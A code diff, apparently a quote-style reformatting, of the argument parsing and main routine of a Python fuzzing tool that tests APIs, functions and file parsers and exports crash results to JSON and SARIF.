-    func_parser.add_argument('--sast-findings', help='SAST findings JSON file')
-    func_parser.add_argument('--output', default='fuzz_results.json', help='Output file')
-    func_parser.add_argument('--no-sandbox', action='store_true', help='Disable Docker sandbox (UNSAFE!)')
+    func_parser = subparsers.add_parser("function", help="Fuzz Python function")
+    func_parser.add_argument("--target", required=True, help="Path:function (e.g., src/parser.py:parse_xml)")
+    func_parser.add_argument("--duration", type=int, default=30, help="Duration in minutes")
+    func_parser.add_argument("--sast-findings", help="SAST findings JSON file")
+    func_parser.add_argument("--output", default="fuzz_results.json", help="Output file")
+    func_parser.add_argument("--no-sandbox", action="store_true", help="Disable Docker sandbox (UNSAFE!)")
 
     # File parser fuzzing
-    parser_parser = subparsers.add_parser('parser', help='Fuzz file parser')
-    parser_parser.add_argument('--target', required=True, help='Path:function')
-    parser_parser.add_argument('--file-type', required=True, choices=['json', 'xml', 'csv', 'pdf', 'image'])
-    parser_parser.add_argument('--duration', type=int, default=30, help='Duration in minutes')
-    parser_parser.add_argument('--output', default='fuzz_results.json', help='Output file')
-    parser_parser.add_argument('--no-sandbox', action='store_true', help='Disable Docker sandbox (UNSAFE!)')
+    parser_parser = subparsers.add_parser("parser", help="Fuzz file parser")
+    parser_parser.add_argument("--target", required=True, help="Path:function")
+    parser_parser.add_argument("--file-type", required=True, choices=["json", "xml", "csv", "pdf", "image"])
+    parser_parser.add_argument("--duration", type=int, default=30, help="Duration in minutes")
+    parser_parser.add_argument("--output", default="fuzz_results.json", help="Output file")
+    parser_parser.add_argument("--no-sandbox", action="store_true", help="Disable Docker sandbox (UNSAFE!)")
 
     # CI mode
-    ci_parser = subparsers.add_parser('ci', help='Quick fuzzing for CI/CD')
-    ci_parser.add_argument('--budget', default='5min', help='Time budget (e.g., 5min, 30min, 1hr)')
-    ci_parser.add_argument('--output', default='fuzz_results.json', help='Output file')
+    ci_parser = subparsers.add_parser("ci", help="Quick fuzzing for CI/CD")
+    ci_parser.add_argument("--budget", default="5min", help="Time budget (e.g., 5min, 30min, 1hr)")
+    ci_parser.add_argument("--output", default="fuzz_results.json", help="Output file")
 
     args = parser.parse_args()
 
@@ -1198,8 +1231,8 @@ def main():
 
     # Build config based on arguments
     config = None
-    if args.command in ('function', 'parser'):
-        use_sandbox = not getattr(args, 'no_sandbox', False)
+    if args.command in ("function", "parser"):
+        use_sandbox = not getattr(args, "no_sandbox", False)
         if not use_sandbox:
             logger.warning("⚠️  SANDBOX DISABLED - Running in UNSAFE mode!")
             logger.warning("⚠️  Untrusted code will execute directly on your system!")
@@ -1208,67 +1241,56 @@ def main():
             target=FuzzTarget.PYTHON_FUNCTION,
             target_path="",
             use_sandbox=use_sandbox,
-            timeout_seconds=getattr(args, 'duration', 30) * 60
+            timeout_seconds=getattr(args, "duration", 30) * 60,
         )
 
     # Initialize engine
     engine = FuzzingEngine(config=config)
 
     try:
-        if args.command == 'api':
+        if args.command == "api":
             result = engine.fuzz_api(
-                args.spec,
-                duration_minutes=args.duration,
-                base_url=args.base_url,
-                verify_ssl=not args.no_verify_ssl
+                args.spec, duration_minutes=args.duration, base_url=args.base_url, verify_ssl=not args.no_verify_ssl
             )
 
-        elif args.command == 'function':
-            path, func = args.target.split(':')
+        elif args.command == "function":
+            path, func = args.target.split(":")
             sast_findings = None
             if args.sast_findings:
                 with open(args.sast_findings) as f:
                     sast_findings = json.load(f)
 
-            result = engine.fuzz_function(
-                path, func,
-                duration_minutes=args.duration,
-                sast_findings=sast_findings
-            )
+            result = engine.fuzz_function(path, func, duration_minutes=args.duration, sast_findings=sast_findings)
 
-        elif args.command == 'parser':
-            path, func = args.target.split(':')
-            result = engine.fuzz_file_parser(
-                path, func,
-                file_type=args.file_type,
-                duration_minutes=args.duration
-            )
+        elif args.command == "parser":
+            path, func = args.target.split(":")
+            result = engine.fuzz_file_parser(path, func, file_type=args.file_type, duration_minutes=args.duration)
 
-        elif args.command == 'ci':
+        elif args.command == "ci":
             # Parse budget
-            budget_map = {'5min': 5, '30min': 30, '1hr': 60}
+            budget_map = {"5min": 5, "30min": 30, "1hr": 60}
             duration = budget_map.get(args.budget, 5)
 
             # Quick API fuzz if spec exists
-            if Path('openapi.yaml').exists():
-                result = engine.fuzz_api('openapi.yaml', duration_minutes=duration)
+            if Path("openapi.yaml").exists():
+                result = engine.fuzz_api("openapi.yaml", duration_minutes=duration)
             else:
                 logger.error("No OpenAPI spec found for CI fuzzing")
                 return 1
 
         # Save results
         output_path = Path(args.output)
-        with open(output_path, 'w') as f:
+        with open(output_path, "w") as f:
             json.dump(result.to_dict(), f, indent=2)
 
         # Also export to SARIF
-        sarif_path = output_path.with_suffix('.sarif')
+        sarif_path = output_path.with_suffix(".sarif")
         engine.export_crashes_to_sarif(result.crashes, sarif_path)
 
         # Print summary
-        print(f"\n{'='*60}")
+        print(f"\n{'=' * 60}")
         print(f"Fuzzing Results: {result.target}")
-        print(f"{'='*60}")
+        print(f"{'=' * 60}")
         print(f"Duration: {result.duration_seconds}s")
         print(f"Iterations: {result.total_iterations:,}")
         print(f"Exec/sec: {result.executions_per_second:.1f}")
@@ -1295,5 +1317,5 @@ def main():
             engine.cleanup()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     sys.exit(main())
